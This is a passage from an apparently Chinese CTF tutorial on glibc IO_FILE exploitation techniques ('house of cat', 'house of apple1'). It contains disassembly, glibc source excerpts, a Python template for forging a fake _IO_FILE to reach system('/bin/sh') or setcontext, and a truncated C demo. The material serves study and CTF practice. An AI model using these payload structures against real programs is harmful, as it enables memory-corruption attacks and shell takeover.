<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
<p>主要关注这几句，做了一下几点事情</p>
<ol>
<li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p>
</li>
<li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p>
</li>
<li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li>
<li>call调用[rax2+0x18]处的内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34&lt;_IO_switch_to_wget_mode+4&gt;   mov  rax, qword ptr [rdi+0xa0]</span><br><span class="line">0x7f4cae745d3f&lt;_IO_switch_to_wget_mode+15&gt;  mov  rdx, qword ptr [rax+0x20]</span><br><span class="line">0x7f4cae745d49&lt;_IO_switch_to_wget_mode+25&gt;  mov  rax, qword ptr [rax+0xe0]</span><br><span class="line">0x7f4cae745d55&lt;_IO_switch_to_wget_mode+37&gt;  call  qword ptr [rax+0x18]</span><br></pre></td></tr></table></figure>
<p>而rdi此时的状态:</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p>
<p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p>
<p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p>
<ul>
<li>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</li>
<li>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</li>
</ul>
<h3 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h3><p>完全按照流程走下来需要满足的条件是</p>
<ol>
<li><p>fp-&gt;_lock是一个可写地址_</p>
</li>
<li><p>_(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p>
<p>   || (_IO_vtable_offset (fp) == 0</p>
<p>​     &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</p>
<p>​      > fp-&gt;_wide_data-&gt;_IO_write_base))</p>
</li>
<li><p>fp-&gt;_mode!=0</p>
</li>
<li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr> fp-&gt;_wide_data-&gt;_IO_write_base或者_IO_CURRENTLY_PUTTING标志为1</p>
</li>
<li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p>
</li>
</ol>
<p>整理一下可以缩减为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mode&gt;<span class="number">0</span></span><br><span class="line">_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end<span class="comment">//这个条件不知道是在哪里要求的,我跟着流程似乎并没有找到这个条件</span></span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p>
<p>需要具体问题具体调整（<strong>FSOP需将vtable改为IO_wfile_jumps+0x30</strong>）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10/0x30</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
<h2 id="例题-6"><a href="#例题-6" class="headerlink" title="例题"></a>例题</h2><p><strong>2022强网-house of cat</strong></p>
<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h2 id="概要-14"><a href="#概要-14" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of apple1利用largebin attack 修改_IO_list_all,然后主要是利用控制_wide_data字段,以及vtable偏移调用_IO_wstrn_jumps,从而做到修改内存为已知值</p>
<p><code>house of apple1</code> 的利用链可以在任意地址写堆地址，相当于再一次<code>largebin attack</code>的效果。因此，<code>house of apple1</code> 需要和其他方法结合而进行后续的<code>FSOP</code>利用。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数</li>
<li>能够泄露堆地址和libc基址</li>
<li>能使用一次<code>largebin attack</code>（一次即可）</li>
<li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li>
</ol>
<p><strong>利用效果:</strong>任意地址写堆地址—&gt;控制流</p>
<p><strong>有效版本:</strong>2.36及以前</p>
<p><strong>失效原因:</strong>2.37开始,不再存在_IO_wstrn_overflow函数,甚至去除了整个_IO_wstrn_jumps</p>
<h2 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h2><p><strong>前言:</strong>众所周知，<code>glibc</code>高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等等一众<code>hook</code>全局变量，<code>ctf</code>中<code>pwn</code>题对<code>hook</code>钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对<code>IO_FILE</code>结构体的伪造与<code>IO</code>流的攻击。之前很多师傅都提出了一些优秀的攻击方法，比如house of pig,house of kiwi和 house of emma等。</p>
<p>其中，<code>house of pig</code>除了需要劫持<code>IO_FILE</code>结构体，还需要劫持<code>tcache_perthread_struct</code>结构体或者能控制任意地址分配；<code>house of kiwi</code>则至少需要修改三个地方的值：<code>_IO_helper_jumps + 0xA0</code>和<code>_IO_helper_jumps + 0xA8</code>，另外还要劫持<code>_IO_file_jumps + 0x60</code>处的<code>_IO_file_sync</code>指针；而<code>house of emma</code>则至少需要修改两个地方的值，一个是<code>tls</code>结构体的<code>point_guard</code>(或者想办法泄露出来)，另外需要<strong>伪造一个<code>IO_FILE</code>或替换<code>vtable</code>为<code>xxx_cookie_jumps</code>的地址。</strong></p>
<p>总的来看，如果想使用上述方法成功地攻击<code>IO</code>，至少需要两次写或者一次写和一次任意地址读。而在只给一次任意地址写（如一次<code>largebin attack</code>）的情景下是很难利用成功的。</p>
<p><code>largebin attack</code>是高版本中为数不多的可以任意地址写一个堆地址的方法，并常常和上述三种方法结合起来利用。本文将给出一种新的利用方法，在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用。顺便说一下，house of banana 也只需要一次<code>largebin attack</code>，但是其攻击的是<code>rtld_global</code>结构体，而不是<code>IO</code>流。</p>
<hr>
<p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数，该调用链为：</p>
<ul>
<li>exit<ul>
<li>fcloseall<ul>
<li>_IO_cleanup<ul>
<li>_IO_flush_all_lockp(_IO_flush_all)<ul>
<li>_IO_OVERFLOW</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。</p>
<p>使用<code>largebin attack</code>可以劫持<code>_IO_list_all</code>变量，将其替换为伪造的<code>IO_FILE</code>结构体，而在此时，我们其实仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。要想修改其他地方的值，就离不开<code>_IO_FILE</code>的一个成员<code>_wide_data</code>的利用</p>
<p>在伪造<code>_IO_FILE</code>结构体的时候，伪造<code>_wide_data</code>变量，然后通过某些函数，比如<code>_IO_wstrn_overflow</code>就可以将已知地址空间上的某些值修改为一个已知值。</p>
<p><strong>glibc/libio/vswprintf.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分析一下这个函数，首先将<code>fp</code>强转为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p>
<p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p>
<p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">//使上面两个条件至少有一个不满足</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code>，在<code>vtable</code>后面。</p>
<p>而<code>struct _IO_wide_data</code>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>换而言之，假如此时在堆上伪造一个<code>_IO_FILE</code>结构体并已知其地址为<code>A</code>，将<code>A + 0xd8</code>替换为<code>_IO_wstrn_jumps</code>地址，<code>A + 0xc0</code>设置为<code>B</code>，并设置其他成员以便能调用到<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>B</code>至<code>B + 0x38</code>的地址区域的内容都替换为<code>A + 0xf0</code>或者<code>A + 0x1f0</code>。</p>
<p>一个<code>demo</code>程序验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span 